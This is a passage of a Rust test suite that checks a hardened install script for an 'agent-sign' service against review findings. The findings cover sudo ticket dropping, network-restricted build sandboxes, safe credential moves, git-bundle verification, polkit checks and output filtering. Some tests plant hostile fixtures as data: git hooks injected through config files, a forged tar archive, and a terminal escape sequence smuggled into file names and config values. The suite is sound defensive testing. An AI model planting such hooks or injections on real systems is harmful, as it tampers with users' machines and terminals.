        &run,
        "a build with a test hook, with a hostile script in the archive",
        &["test", "stand-in", "check-binary-clean", "refus"],
    );
    assert!(
        !m.top.join("source-script-ran").exists(),
        "the archive's own check-binary-clean.sh was run"
    );
    assert!(!m.exists("opt/agent-sign/current"));

    let script = fs::read_to_string(script_path()).unwrap();
    for l in script.lines() {
        let t = l.trim_start();
        if t.starts_with('#') {
            continue;
        }
        assert!(
            !(l.contains("check-binary-clean")
                && (l.contains("$WORK/src") || l.contains("$SOURCE"))),
            "the script still takes check-binary-clean from the source: {l}"
        );
    }
}

fn is_drop_line(l: &str) -> bool {
    if l.trim_start().starts_with('#') || !l.contains("sudo") {
        return false;
    }
    let cleaned: String = l
        .chars()
        .map(|c| if ";()\"&|".contains(c) { ' ' } else { c })
        .collect();
    cleaned
        .split_whitespace()
        .any(|x| matches!(x, "-k" | "-K" | "--reset-timestamp" | "--remove-timestamp"))
}

fn uses_sudo_line(l: &str) -> bool {
    !l.trim_start().starts_with('#')
        && !is_drop_line(l)
        && (l.contains("as_root") || l.contains("as_user") || l.contains("sudo "))
}

/// A-3, I-A3, static (the real-machine launches don't run under a test root). In
/// every function, each line that runs an installed program as the administrator
/// (`"$CURRENT_BIN/agent-sign" ...`: the health check, the probe launch and the end
/// checks' launches) is preceded, in the same function, by a `sudo -k` (directly or
/// through a helper that does it), with no sudo use between the two.
///
/// Brittle by nature: it reads shell text. It does not run anything, so it can't show
/// what a real sudo does.
///
/// Fails today: nothing in the script ends the ticket.
#[test]
fn a3_static_every_line_that_runs_an_installed_program_is_preceded_by_sudo_k_in_its_function() {
    let text = sitting_sources();
    let funcs = shell_functions(&text);
    let mut drop_fns: BTreeSet<String> = funcs
        .iter()
        .filter(|(_, b)| b.iter().any(|l| is_drop_line(l)))
        .map(|(n, _)| n.clone())
        .collect();
    for _ in 0..3 {
        let more: Vec<String> = funcs
            .iter()
            .filter(|(n, b)| {
                !drop_fns.contains(n)
                    && b.iter().any(|l| drop_fns.iter().any(|d| has_word(l, d)))
                    && !b.iter().any(|l| uses_sudo_line(l))
            })
            .map(|(n, _)| n.clone())
            .collect();
        drop_fns.extend(more);
    }
    let mut sudo_fns: BTreeSet<String> = funcs
        .iter()
        .filter(|(n, b)| !drop_fns.contains(n) && b.iter().any(|l| uses_sudo_line(l)))
        .map(|(n, _)| n.clone())
        .collect();
    for _ in 0..4 {
        let more: Vec<String> = funcs
            .iter()
            .filter(|(n, b)| {
                !drop_fns.contains(n)
                    && !sudo_fns.contains(n)
                    && b.iter().any(|l| sudo_fns.iter().any(|d| has_word(l, d)))
            })
            .map(|(n, _)| n.clone())
            .collect();
        sudo_fns.extend(more);
    }
    let calls_drop = |l: &str| drop_fns.iter().any(|d| has_word(l, d)) || is_drop_line(l);
    let touches_sudo = |l: &str| uses_sudo_line(l) || sudo_fns.iter().any(|d| has_word(l, d));

    let mut found = 0;
    let mut bad = Vec::new();
    for (name, body) in &funcs {
        for (i, l) in body.iter().enumerate() {
            let t = l.trim_start();
            if t.starts_with('#') || l.contains("as_user") || l.contains("as_root") {
                continue;
            }
            let Some(idx) = l.find("$CURRENT_BIN") else {
                continue;
            };
            let prev = &l[..idx];
            if !(prev.ends_with('"') && prev.matches('"').count() % 2 == 1) {
                continue; // inside a message, not a command
            }
            found += 1;
            if calls_drop(prev) {
                continue;
            }
            let mut ok = false;
            for j in (0..i).rev() {
                if calls_drop(&body[j]) {
                    ok = !body[j + 1..i].iter().any(|x| touches_sudo(x));
                    break;
                }
            }
            if !ok {
                bad.push(format!("{name}: {}", l.trim()));
            }
        }
    }
    assert!(
        found >= 1,
        "the static check found no line that runs an installed program (the script changed shape?)"
    );
    assert!(
        bad.is_empty(),
        "A-3: these lines run an installed program without a `sudo -k` before them in their function:\n{}",
        bad.join("\n")
    );
}

// ---------------------------------------------------------------- A-4 (MEDIUM)

/// A-4, the fetch phase. The throwaway build is two `systemd-run` calls. The first (the
/// fetch: toolchain download, `cargo fetch`) runs with `IPAddressDeny=` covering loopback
/// (127.0.0.0/8, ::1), Tailscale (100.64.0.0/10, fd7a:115c:a1e0::/48), RFC 1918
/// (10/8, 172.16/12, 192.168/16), link-local and the cloud metadata address
/// (169.254.0.0/16, fe80::/10) and unique-local (fc00::/7); it does not deny the public
/// internet (the toolchain and crates come from there); it allows exactly the
/// effective resolvers, as single addresses (`IPAddressAllow` wins over `IPAddressDeny`);
/// and it has `TemporaryFileSystem=/run`, with the resolver still reachable: hetzner's
/// `/etc/resolv.conf` is a link into `/run/systemd/resolve`, which must be bound back
/// in. Static as far as it goes: it reads the arguments the stand-in `systemd-run`
/// received. It can't show that systemd enforces them.
///
/// Fails today: one `systemd-run` call, no `IPAddressDeny`.
#[test]
fn a4_the_fetch_phase_denies_the_local_and_private_networks_and_allows_only_the_resolver() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let calls = systemd_run_calls(&m);
    assert!(
        calls.len() >= 2,
        "A-4: the build must be two throwaway runs (fetch, then compile); saw {} systemd-run call(s)",
        calls.len()
    );
    let fetch = calls
        .iter()
        .find(|c| !props(c, "IPAddressDeny").is_empty())
        .expect("A-4: no systemd-run call sets IPAddressDeny (the fetch phase)");
    let deny: Vec<Cidr> = props(fetch, "IPAddressDeny")
        .iter()
        .flat_map(|v| expand_ranges(v))
        .collect();
    for (what, range) in [
        ("loopback 127.0.0.0/8", "127.0.0.0/8"),
        ("loopback ::1", "::1/128"),
        ("Tailscale 100.64.0.0/10", "100.64.0.0/10"),
        ("Tailscale fd7a:115c:a1e0::/48", "fd7a:115c:a1e0::/48"),
        ("RFC 1918 10.0.0.0/8", "10.0.0.0/8"),
        ("RFC 1918 172.16.0.0/12", "172.16.0.0/12"),
        ("RFC 1918 192.168.0.0/16", "192.168.0.0/16"),
        ("link-local and metadata 169.254.0.0/16", "169.254.0.0/16"),
        ("link-local fe80::/10", "fe80::/10"),
        ("unique-local fc00::/7", "fc00::/7"),
    ] {
        let r = cidr(range);
        assert!(
            deny.iter().any(|d| covers(d, &r)),
            "A-4: the fetch phase does not deny {what} (IPAddressDeny={:?})",
            props(fetch, "IPAddressDeny")
        );
    }
    for public in [
        "1.1.1.1",
        "151.101.1.1",
        "13.224.0.1",
        "2606:4700:4700::1111",
        "2a04:4e42::1",
    ] {
        let r = cidr(public);
        assert!(
            !deny.iter().any(|d| covers(d, &r)),
            "A-4: the fetch phase denies the public address {public}, which it needs"
        );
    }
    // The resolvers: hetzner's stub, exactly.
    let allow: BTreeSet<std::net::IpAddr> = props(fetch, "IPAddressAllow")
        .iter()
        .flat_map(|v| expand_ranges(v))
        .map(|c| {
            let full = if c.v6 { 128 } else { 32 };
            assert_eq!(c.len, full, "A-4: IPAddressAllow must be single addresses");
            if c.v6 {
                std::net::IpAddr::V6(std::net::Ipv6Addr::from(c.addr))
            } else {
                std::net::IpAddr::V4(std::net::Ipv4Addr::from(c.addr as u32))
            }
        })
        .collect();
    let want: BTreeSet<std::net::IpAddr> = ["127.0.0.53".parse().unwrap()].into();
    assert_eq!(
        allow, want,
        "A-4: IPAddressAllow must be exactly the effective resolvers (hetzner: the stub 127.0.0.53)"
    );
    // /run is hidden, the resolver is bound back.
    assert!(
        props(fetch, "TemporaryFileSystem")
            .iter()
            .any(|v| v == "/run" || v.starts_with("/run:")),
        "A-4: the fetch phase must have TemporaryFileSystem=/run"
    );
    let binds: Vec<String> = props(fetch, "BindReadOnlyPaths")
        .into_iter()
        .chain(props(fetch, "BindPaths"))
        .collect();
    assert!(
        binds.iter().any(|b| {
            let b = b.trim_start_matches(['-', '+']);
            let (src, dst) = b.split_once(':').unwrap_or((b, ""));
            src.starts_with("/run/systemd/resolve") || dst == "/etc/resolv.conf"
        }),
        "A-4: /etc/resolv.conf is a link into /run/systemd/resolve; with TemporaryFileSystem=/run the resolver is unreachable unless it is bound back in (binds: {binds:?})"
    );
}

/// A-4: the allowance follows the machine's own resolver. On the Pi, `/etc/resolv.conf`
/// is Tailscale's (a plain file: 100.100.100.100 and fd7a:115c:a1e0::53): those two
/// addresses, inside the denied ranges, are the only allowances. (Run as the hetzner
/// machine with the Pi's resolver file; the sitting has no Pi leg yet.)
///
/// Fails today: no `IPAddressAllow`.
#[test]
fn a4_the_resolver_allowance_follows_the_machines_resolv_conf() {
    let m = Machine::new();
    fs::remove_file(m.path("etc/resolv.conf")).unwrap();
    m.put(
        "etc/resolv.conf",
        "nameserver 100.100.100.100\nnameserver fd7a:115c:a1e0::53\nsearch example.ts.net\n",
        0o644,
    );
    must_succeed(&m.sitting(&[]), "the run with the Pi's resolver");
    let calls = systemd_run_calls(&m);
    let fetch = calls
        .iter()
        .find(|c| !props(c, "IPAddressDeny").is_empty())
        .expect("A-4: no systemd-run call sets IPAddressDeny (the fetch phase)");
    let allow: BTreeSet<String> = props(fetch, "IPAddressAllow")
        .iter()
        .flat_map(|v| expand_ranges(v))
        .map(|c| {
            let full = if c.v6 { 128 } else { 32 };
            assert_eq!(c.len, full, "IPAddressAllow must be single addresses");
            if c.v6 {
                std::net::Ipv6Addr::from(c.addr).to_string()
            } else {
                std::net::Ipv4Addr::from(c.addr as u32).to_string()
            }
        })
        .collect();
    let want: BTreeSet<String> = ["100.100.100.100", "fd7a:115c:a1e0::53"]
        .iter()
        .map(|s| s.to_string())
        .collect();
    assert_eq!(
        allow, want,
        "A-4: the resolvers of the Pi's resolv.conf, exactly"
    );
}

/// A-4, the compile phase. After the fetch, a second throwaway run compiles with
/// `PrivateNetwork=yes` (no network at all); the fetch phase has not got it (it needs
/// DNS and the internet); both are throwaway dynamic users; and every `cargo build` in
/// the shipped scripts is offline (`--frozen` or `--offline`).
///
/// Fails today: one `systemd-run` call, with a network.
#[test]
fn a4_the_compile_phase_has_no_network_and_comes_after_the_fetch() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let calls = systemd_run_calls(&m);
    assert!(
        calls.len() >= 2,
        "A-4: the build must be two throwaway runs; saw {} systemd-run call(s)",
        calls.len()
    );
    let yes = |c: &Vec<String>| {
        props(c, "PrivateNetwork")
            .iter()
            .any(|v| v == "yes" || v == "true" || v == "1")
    };
    let fetch_i = calls
        .iter()
        .position(|c| !props(c, "IPAddressDeny").is_empty())
        .expect("A-4: no fetch phase (no IPAddressDeny)");
    let compile_i = calls
        .iter()
        .position(yes)
        .expect("A-4: no systemd-run call sets PrivateNetwork=yes (the compile phase)");
    assert!(
        fetch_i < compile_i,
        "the fetch (call {fetch_i}) must come before the compile (call {compile_i})"
    );
    assert!(!yes(&calls[fetch_i]), "the fetch phase needs the network");
    for c in [&calls[fetch_i], &calls[compile_i]] {
        assert!(
            props(c, "DynamicUser").iter().any(|v| v == "yes"),
            "both phases run as a throwaway account"
        );
    }
    for entry in fs::read_dir(sitting_dir().join("files")).unwrap().flatten() {
        let p = entry.path();
        if p.extension().is_some_and(|e| e == "sh")
            && p.file_name().is_some_and(|n| n != "check-binary-clean.sh")
        {
            for l in fs::read_to_string(&p).unwrap().lines() {
                let t = l.trim_start();
                if t.starts_with('#') || t.starts_with("echo") || t.starts_with("printf") {
                    continue;
                }
                if l.contains("cargo build") || l.contains("cargo test") {
                    let cont = fs::read_to_string(&p).unwrap();
                    assert!(
                        l.contains("--frozen")
                            || l.contains("--offline")
                            || cont.contains("CARGO_NET_OFFLINE=true"),
                        "{}: a cargo build that may use the network: {l}",
                        p.display()
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------- A-5 (LOW)

/// A-5: a failed move of the login must never clobber a good stored one. After a
/// first run (the login stored), Taylor is delivered a new login and the move goes
/// wrong in each way the old pipeline mishandled: the delivered file can't be
/// decrypted (the pipe then encrypts an empty secret over the stored one); the encryption
/// fails after writing part of the file; it writes nothing and says it worked. The stored
/// secret and role ID stay exactly as they were, the delivered file is kept, and the run
/// stops with a plain message. (Fix: decrypt, check non-empty, write `.new`, then `mv`.)
///
/// Fails today: the stored secret is overwritten with an empty or partial file.
#[test]
fn a5_a_failed_login_move_never_clobbers_a_good_stored_login() {
    let mut problems: Vec<String> = Vec::new();
    for (what, mode) in [
        ("the delivered login cannot be decrypted", 0),
        ("encryption fails after writing part of the file", 1),
        ("encryption writes nothing and says it worked", 2),
    ] {
        let m = Machine::new();
        must_succeed(&m.sitting(&[]), &format!("{what}: the first run"));
        assert_eq!(decoded(&m, STORED_SECRET_REL).as_deref(), Some(SECRET_ID));
        match mode {
            0 => m.put(DELIVERED_LOGIN, "!!!not base64!!!\n", 0o600),
            1 => {
                m.put(DELIVERED_LOGIN, &b64(NEW_SECRET_ID), 0o600);
                m.set("CREDS_ENCRYPT_FAIL", "1");
            }
            _ => {
                m.put(DELIVERED_LOGIN, &b64(NEW_SECRET_ID), 0o600);
                m.set("CREDS_ENCRYPT_EMPTY", "1");
            }
        }
        let run = m.sitting(&[]);
        if decoded(&m, STORED_SECRET_REL).as_deref() != Some(SECRET_ID) {
            problems.push(format!(
                "({what}): the stored secret ID was clobbered by the failed move (now {:?})",
                decoded(&m, STORED_SECRET_REL)
            ));
        }
        if decoded(&m, STORED_ROLE_REL).as_deref() != Some(LOGIN_NAME) {
            problems.push(format!("({what}): the stored role ID was clobbered"));
        }
        if !m.exists(DELIVERED_LOGIN) {
            problems.push(format!(
                "({what}): the delivered login was removed although the move failed"
            ));
        }
        if run.code == 0
            || !run
                .text()
                .lines()
                .any(|l| l.trim_start().starts_with("Stopped:"))
        {
            problems.push(format!(
                "({what}): the run did not stop with a plain message"
            ));
        }
        no_secret_in(&run.text(), what);
    }
    assert!(
        problems.is_empty(),
        "A-5: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
}

/// A-5, the control: a good new login replaces the stored one, the delivered copy is
/// removed, and nothing but the two credential files is left in the store.
///
/// Passes today and must keep passing.
#[test]
fn a5_control_a_good_new_login_replaces_the_stored_one_and_leaves_no_partial_file() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the first run");
    m.put(DELIVERED_LOGIN, &b64(NEW_SECRET_ID), 0o600);
    must_succeed(&m.sitting(&[]), "the run with a new login");
    assert_eq!(
        decoded(&m, STORED_SECRET_REL).as_deref(),
        Some(NEW_SECRET_ID)
    );
    assert_eq!(decoded(&m, STORED_ROLE_REL).as_deref(), Some(LOGIN_NAME));
    assert!(
        !m.exists(DELIVERED_LOGIN),
        "the delivered login stays after a good move"
    );
    let mut left: Vec<String> = fs::read_dir(m.path("etc/credstore.encrypted"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    left.sort();
    assert_eq!(left, vec!["agent-sign.role-id", "agent-sign.secret-id"]);
}

// ---------------------------------------------------------------- A-6 (LOW)

/// A-6, I-A6: `--source` is a git bundle. A tar is refused, with a plain message that
/// says a bundle is needed, before any change, in a real run and a dry run: both a
/// genuine `git archive` of the commit and a tar whose CONTENT was changed under the
/// same commit-id header (`git get-tar-commit-id` only proves the header; this was
/// the finding).
///
/// Fails today: both tars are accepted (the run goes on to install).
#[test]
fn a6_a_tar_is_refused_even_when_its_header_names_the_commit_and_even_when_its_content_was_changed()
{
    let m = Machine::new();
    let mut bytes = fs::read(&m.source_tar).unwrap();
    let from = b"version = \"0.0.0\"";
    let pos = bytes
        .windows(from.len())
        .position(|w| w == from)
        .expect("the tar holds Cargo.toml's version line");
    bytes[pos..pos + from.len()].copy_from_slice(b"version = \"6.6.6\"");
    let forged = m.top.join("forged.tar");
    fs::write(&forged, &bytes).unwrap();
    let genuine = m.source_tar.clone();
    let mut problems: Vec<String> = Vec::new();
    for (what, file) in [
        ("a genuine git archive tar", genuine),
        (
            "a tar with changed content under the same commit header",
            forged,
        ),
    ] {
        for extra in [&[][..], &["--dry-run"][..]] {
            let before = m.snap();
            let run = m.sitting_from(&file, extra);
            let t = run.text();
            let stopped = t.lines().find(|l| l.trim_start().starts_with("Stopped:"));
            // S7 (lint only, no assertion changed): `match` in place of is_none + unwrap.
            match stopped {
                Some(s) if run.code != 0 => {
                    if !s.to_lowercase().contains("bundle") {
                        problems.push(format!(
                            "{what} {extra:?}: the message doesn't say a bundle is needed: {s}"
                        ));
                    }
                }
                _ => problems.push(format!("{what} {extra:?}: accepted (exit {})", run.code)),
            }
            let d = diff(&before, &m.snap());
            if !d.is_empty() || !m.mutations().is_empty() {
                problems.push(format!("{what} {extra:?}: the machine changed"));
                break;
            }
        }
    }
    assert!(
        problems.is_empty(),
        "A-6: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
}

/// A-6, I-A6: a bundle that doesn't hold the commit is refused with a plain message
/// that names the bundle, before any change: a bundle of another history; a bundle of a
/// branch that stops before the commit; an incremental bundle that needs the commit as a
/// prerequisite (git can't apply it in an empty repository); a truncated bundle; and a
/// file that isn't a bundle.
///
/// (The files are given names without the word "bundle", so only a message that says it
/// can pass.)
///
/// Fails today: every one of them is refused only as "not a git archive of a commit",
/// a message that doesn't mention a bundle (the script has no idea what a bundle is).
#[test]
fn a6_a_bundle_that_does_not_hold_the_commit_is_refused_and_nothing_is_changed() {
    let m = Machine::new();
    let other = m.top.join("otherrepo");
    fs::create_dir_all(&other).unwrap();
    git_in(&other, &["init", "-q"]);
    fs::write(other.join("f"), "x").unwrap();
    git_in(&other, &["add", "-A"]);
    git_in(&other, &["commit", "-q", "-m", "another history"]);
    let b_other = m.top.join("other-history.src");
    git_in(
        &other,
        &[
            "bundle",
            "create",
            &b_other.to_string_lossy(),
            "refs/heads/main",
        ],
    );
    let b_old = m.top.join("stops-early.src");
    git_in(
        &m.repo,
        &[
            "bundle",
            "create",
            &b_old.to_string_lossy(),
            "refs/heads/old",
        ],
    );
    let b_range = m.top.join("needs-prerequisite.src");
    git_in(
        &m.repo,
        &[
            "bundle",
            "create",
            &b_range.to_string_lossy(),
            &format!("{}..refs/heads/main", m.commit),
        ],
    );
    let whole = fs::read(&m.source).unwrap();
    let b_cut = m.top.join("cut-short.src");
    fs::write(&b_cut, &whole[..whole.len() * 6 / 10]).unwrap();
    let b_junk = m.top.join("junk.src");
    fs::write(&b_junk, "this is not a bundle\n").unwrap();
    let mut problems: Vec<String> = Vec::new();
    for (what, file) in [
        ("a bundle of another history", b_other),
        ("a bundle that stops before the commit", b_old),
        ("an incremental bundle that needs the commit", b_range),
        ("a truncated bundle", b_cut),
        ("a file that is not a bundle", b_junk),
    ] {
        let before = m.snap();
        let run = m.sitting_from(&file, &[]);
        let t = run.text();
        let stopped = t.lines().find(|l| l.trim_start().starts_with("Stopped:"));
        // S7 (lint only, no assertion changed): `match` in place of is_none + unwrap.
        match stopped {
            Some(s) if run.code != 0 => {
                if !s.to_lowercase().contains("bundle") {
                    problems.push(format!("{what}: the message doesn't name the bundle: {s}"));
                }
            }
            _ => problems.push(format!("{what}: not refused with a plain Stopped line")),
        }
        let d = diff(&before, &m.snap());
        if !d.is_empty() || !m.mutations().is_empty() {
            problems.push(format!(
                "{what}: the machine changed: {d:?} {:?}",
                m.mutations()
            ));
        }
    }
    assert!(
        problems.is_empty(),
        "A-6: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
}

/// A-6, I-A6, the good bundle. A bundle of `main` that holds the pinned commit as an
/// ancestor is accepted, and the script: runs `git bundle verify`, fetches the bundle's
/// refs, requires `git cat-file -e <commit>^{commit}`, builds from `git archive <commit>`
/// of that repository (the pinned tree, not `main`'s tip), in that order; every one of
/// those git calls has git's config isolated (`GIT_CONFIG_GLOBAL=/dev/null`,
/// `GIT_CONFIG_NOSYSTEM=1`), so hooks and templates from Taylor's or the system's git
/// config never run (hostile ones are planted here and leave a marker); nothing from
/// the source is run; and the message says git checked the content's hashes against the
/// commit id.
///
/// Fails today: a bundle is not a tar archive ("not a git archive of a commit").
#[test]
fn a6_a_good_bundle_is_verified_by_git_in_an_isolated_repository_and_the_build_gets_the_pinned_commit()
 {
    let m = Machine::new();
    let marker = m.top.join("git-hook-ran");
    let hooks = m.top.join("hostile-hooks");
    let template = m.top.join("hostile-template");
    fs::create_dir_all(&hooks).unwrap();
    fs::create_dir_all(template.join("hooks")).unwrap();
    let hook = format!("#!/bin/sh\ntouch '{}'\n", marker.display());
    for dir in [&hooks, &template.join("hooks")] {
        for h in [
            "reference-transaction",
            "post-checkout",
            "post-merge",
            "post-commit",
            "post-rewrite",
            "pre-auto-gc",
        ] {
            let p = dir.join(h);
            fs::write(&p, &hook).unwrap();
            fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
        }
    }
    m.put(
        "home/admin/.gitconfig",
        &format!(
            "[core]\n\thooksPath = {}\n[init]\n\ttemplateDir = {}\n",
            hooks.display(),
            template.display()
        ),
        0o644,
    );
    m.put(
        "etc/gitconfig",
        &format!("[core]\n\thooksPath = {}\n", hooks.display()),
        0o644,
    );

    let run = m.sitting(&[]);
    must_succeed(&run, "the run with a bundle");

    // The order of git's work.
    let git_calls: Vec<Call> = m.calls().into_iter().filter(|c| c.name == "git").collect();
    let find = |f: &dyn Fn(&[&str]) -> bool| {
        git_calls
            .iter()
            .find(|c| f(&c.args.split_whitespace().collect::<Vec<_>>()))
            .unwrap_or_else(|| panic!("a git call is missing; calls: {git_calls:?}"))
    };
    let verify = find(&|t| t.contains(&"bundle") && t.contains(&"verify"));
    let fetch = find(&|t| t.contains(&"fetch"));
    let cat = find(&|t| {
        t.contains(&"cat-file")
            && t.contains(&"-e")
            && t.iter().any(|x| *x == format!("{}^{{commit}}", m.commit))
    });
    let archive = find(&|t| t.contains(&"archive") && t.iter().any(|x| x.contains(&m.commit)));
    assert!(
        verify.seq < fetch.seq && fetch.seq < cat.seq && cat.seq < archive.seq,
        "git's work must go verify ({}), fetch ({}), cat-file -e ({}), archive ({})",
        verify.seq,
        fetch.seq,
        cat.seq,
        archive.seq
    );

    // Config isolation of every git call that handles the source.
    let envs = fs::read_to_string(m.log.join("git-env")).unwrap_or_default();
    let mut seen = BTreeSet::new();
    for l in envs.lines() {
        let f: Vec<&str> = l.splitn(3, '\t').collect();
        let toks: Vec<&str> = f[0].split_whitespace().collect();
        for verb in ["bundle", "fetch", "cat-file", "archive", "init", "clone"] {
            if toks.contains(&verb) {
                seen.insert(verb);
                assert_eq!(
                    (f.get(1).copied(), f.get(2).copied()),
                    (Some("/dev/null"), Some("1")),
                    "A-6: `git {verb}` ran without GIT_CONFIG_GLOBAL=/dev/null and GIT_CONFIG_NOSYSTEM=1: {l}"
                );
            }
        }
    }
    for verb in ["bundle", "fetch", "cat-file", "archive"] {
        assert!(
            seen.contains(verb),
            "no isolated `git {verb}` call recorded"
        );
    }
    assert!(
        !marker.exists(),
        "A-6: a hook from Taylor's or the system's git config ran while the source was handled"
    );
    assert!(
        !m.top.join("source-script-ran").exists(),
        "A-6: something from the source was run"
    );

    // The message.
    let said = run
        .stdout
        .lines()
        .any(|l| l.to_lowercase().contains("hash") && l.contains(&m.commit[..12]));
    assert!(
        said,
        "A-6: no line says git checked the content's hashes against the commit id ({})\n{}",
        &m.commit[..12],
        run.stdout
    );

    // The build gets the pinned commit's tree, not main's tip.
    let mut got_pinned = false;
    let mut n = 1;
    while let Ok(mut b) = fs::read(m.log.join(format!("sr.{n}.in"))) {
        if b.starts_with(&[0x1f, 0x8b]) {
            let mut c = Command::new("gzip")
                .arg("-dc")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .spawn()
                .unwrap();
            let mut si = c.stdin.take().unwrap();
            let raw = b.clone();
            std::thread::spawn(move || {
                let _ = si.write_all(&raw);
            });
            b = c.wait_with_output().unwrap().stdout;
        }
        assert!(
            !contains(&b, "tip-tree-marker-0xB2"),
            "A-6: the build was given main's tip, not the pinned commit"
        );
        got_pinned |= contains(&b, "pinned-tree-marker-0xA1");
        n += 1;
    }
    assert!(
        got_pinned,
        "A-6: the sandbox was not given the pinned commit's tree"
    );
}

// ---------------------------------------------------------------- A-7 (LOW), static

/// A-7, polkit: a refusal check with no positive control proves nothing (a polkit
/// that refuses everything would pass it). The script asks polkit, with `pkcheck`, for an
/// allowed action too: that `agent-launch` MAY start `agent-session@N.service`.
///
/// Static: it reads the script. The real check needs polkit; it is skipped under a test
/// root, so nothing here can run it. It looks for a non-negated, non-"refuses" polkit
/// call for `agent-launch`, an `agent-session@` unit and `start` or `stop`.
///
/// Fails today: only `polkit_refuses` calls exist.
#[test]
fn a7_static_the_polkit_end_checks_have_a_positive_control() {
    let text = sitting_sources();
    let ok = text.lines().any(|l| {
        let low = l.to_lowercase();
        let t = l.trim_start();
        !t.starts_with('#')
            && !t.starts_with('!')
            && (low.contains("pkcheck") || low.contains("polkit") || low.contains("pk_"))
            && !low.contains("refus")
            && l.contains("agent-launch")
            && l.contains("agent-session@")
            && (l.contains("start") || l.contains("stop"))
    });
    assert!(
        ok,
        "A-7: no check asks polkit for a decision that must be YES (agent-launch starting agent-session@N)"
    );
}

/// A-7, the transient-unit refusals: the check that `agent-launch` can't start a transient
/// unit as root passed whenever the command failed for ANY reason (the reviewer: it
/// failed for a different reason). The function that tries `-p User=root` must look
/// at the refusal itself: its output must be matched against polkit's refusal text.
///
/// Static; the real check is skipped under a test root.
///
/// Fails today: the function only negates the exit status.
#[test]
fn a7_static_the_transient_unit_refusal_checks_the_specific_refusal() {
    let funcs = shell_functions(&sitting_sources());
    let (name, body) = funcs
        .iter()
        .find(|(_, b)| {
            b.iter()
                .any(|l| l.contains("User=root") && l.contains("systemd-run"))
        })
        .expect("the function that tries a transient unit as root");
    let looks = body.iter().any(|l| {
        let low = l.to_lowercase();
        low.contains("grep")
            && [
                "denied",
                "authenticat",
                "authoriz",
                "not allowed",
                "permission",
                "polkit",
            ]
            .iter()
            .any(|w| low.contains(w))
    });
    assert!(
        looks,
        "A-7: {name} tries `systemd-run -p User=root` but never matches polkit's refusal text in the output; any failure counts as a pass"
    );
}

/// A-7, the agents' launch: "the agents account can't launch a session" counted ANY
/// error as a pass (the output only had to lack the word `probe`). The function that
/// launches as the agents account must look for the launcher's refusal itself.
///
/// Static; the real check is skipped under a test root.
///
/// Fails today: it only checks that the word `probe` did not come back.
#[test]
fn a7_static_the_agents_launch_refusal_is_the_specific_refusal() {
    let funcs = shell_functions(&sitting_sources());
    let (name, body) = funcs
        .iter()
        .find(|(_, b)| {
            b.iter()
                .any(|l| l.contains("as_user agents") && l.contains(" launch "))
        })
        .expect("the function that tries to launch as the agents account");
    let looks = body.iter().any(|l| {
        let low = l.to_lowercase();
        low.contains("grep")
            && [
                "refus",
                "denied",
                "not allowed",
                "not permitted",
                "permission",
                "not a person",
                "not listed",
                "unauthor",
                "system.toml",
                "client",
            ]
            .iter()
            .any(|w| low.contains(w))
    });
    assert!(
        looks,
        "A-7: {name} counts any error as a refusal; it must match the launcher's refusal text in the output"
    );
}

// ---------------------------------------------------------------- A-8 (LOW)

/// A-8: text the agents control is filtered before it is printed. A control character
/// (escape sequences that set a window title or clear the screen, a bell) in (1) the
/// agents' own `allowedSignersFile` value, printed on the `today:` line, (2) the name of
/// a file in the agents' `environment.d` that sets `AGENT_SIGN_SOCKET`, printed in the
/// stop message, and (3) the git origin printed when D5's removal did nothing, never
/// reaches the terminal raw. The message still names the problem.
///
/// Fails today: the raw bytes are printed in all three.
#[test]
fn a8_control_characters_in_values_the_agents_control_never_reach_the_terminal() {
    let esc = "\u{1b}]0;pwned\u{7}\u{1b}[2J";

    // 1: the `today:` line.
    let m = Machine::new();
    let cfg = m.read("home/agents/.gitconfig").unwrap().replace(
        "/home/agents/.config/git/allowed_signers",
        &format!("/home/agents/{esc}/allowed_signers"),
    );
    m.put("home/agents/.gitconfig", &cfg, 0o664);
    let run = m.sitting(&["--dry-run"]);
    let ctrl = raw_controls(&run.text());
    assert!(
        ctrl.is_empty(),
        "A-8 (the today: line): control characters reached the terminal: {ctrl:?}"
    );
    assert!(
        run.text().contains("today:"),
        "the line is still shown\n{}",
        run.text()
    );

    // 2: a file name in environment.d.
    let m = Machine::new();
    m.put(
        &format!("home/agents/.config/environment.d/{esc}.conf"),
        "AGENT_SIGN_SOCKET=/x\n",
        0o644,
    );
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "AGENT_SIGN_SOCKET in a file with an escape in its name",
        &["AGENT_SIGN_SOCKET"],
    );
    let ctrl = raw_controls(&run.text());
    assert!(
        ctrl.is_empty(),
        "A-8 (the stop message): control characters reached the terminal: {ctrl:?}"
    );

    // 3: D5's origin when the removal did nothing.
    let m = Machine::new();
    let cfg = m.read("home/agents/.gitconfig").unwrap().replace(
        "/home/agents/.config/git/allowed_signers",
        &format!("/home/agents/{esc}/allowed_signers"),
    );
    m.put("home/agents/.gitconfig", &cfg, 0o664);
    m.set("LIE_GIT_UNSET", "1");
    let run = m.sitting(&[]);
    assert_ne!(
        run.code, 0,
        "the removal did nothing but the run says it worked"
    );
    let ctrl = raw_controls(&run.text());
    assert!(
        ctrl.is_empty(),
        "A-8 (D5's message): control characters reached the terminal: {ctrl:?}"
    );
    assert!(
        run.text().to_lowercase().contains("allowedsignersfile"),
        "the message still names the setting\n{}",
        run.text()
    );
}

// ---------------------------------------------------------------- A-9 (LOW)

/// A-9, I-A9: `AGENT_SIGN_SITTING_ROOT` and `AGENT_SIGN_SITTING_GIT` are honoured only
/// with `AGENT_SIGN_SITTING_TEST=1`. Set without it (or with it `0`, empty), the script
/// stops with a plain message that names the variable, before it uses sudo or changes
/// anything. (All runs are `--dry-run`: if the guard is missing, nothing is written, even
/// on the real paths.) And with the flag the same dry run works.
///
/// Fails today: the variables are honoured without the flag.
#[test]
fn a9_the_root_and_git_overrides_are_honoured_only_with_the_explicit_test_flag() {
    let m = Machine::new();
    let root = m.root.to_string_lossy().to_string();
    let git = m.stubs.join("git").to_string_lossy().to_string();
    let commit = m.commit.clone();
